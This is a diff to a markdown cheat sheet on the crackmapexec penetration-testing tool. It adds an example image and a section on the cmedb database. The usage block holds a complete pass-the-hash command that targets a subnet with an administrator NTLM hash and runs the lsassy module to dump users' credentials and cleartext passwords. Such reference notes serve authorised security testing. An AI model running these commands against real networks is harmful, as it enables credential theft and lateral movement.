@@ -70,6 +70,19 @@ Modules are set of objects within `crackmapexec` that makes it more efficient to
 ### **Usage**
 
 ```powershell
-# using lsassy to dump secrets/clear texts 
+# using lsassy to dump logged in users secrets/clear text passwords
 $ sudo crackmapexec smb 192.168.0.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth -M lsassy
+```
+
+#### **Example**
+
+![](https://i.imgur.com/V7a4hFM.png)
+
+
+
+## **Crackmapexec Databases**
+
+```powershell
+# launching database
+$ cmedb
 ```
